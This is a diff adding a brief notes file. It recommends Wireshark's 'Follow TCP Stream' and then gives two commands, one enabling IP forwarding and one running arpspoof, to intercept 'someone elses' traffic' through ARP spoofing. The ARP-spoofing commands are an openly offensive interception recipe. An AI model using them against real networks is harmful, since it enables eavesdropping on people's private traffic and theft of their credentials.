@@ -1,0 +1,12 @@
+Everyone knows wireshark.
+
+Useful feauture: "Follwing TCP Stream". 
+
+Right click on a packet -> Follow -> follow TCP stream.
+
+Note: use arpspoof to catch someone elses' traffic: 
+
+# echo 1> /proc/sys/net/ipv4/ip_forward
+# arpspoof -i wlan0 -t <TGT_IP> -r <ROUTER_IP>
+
+
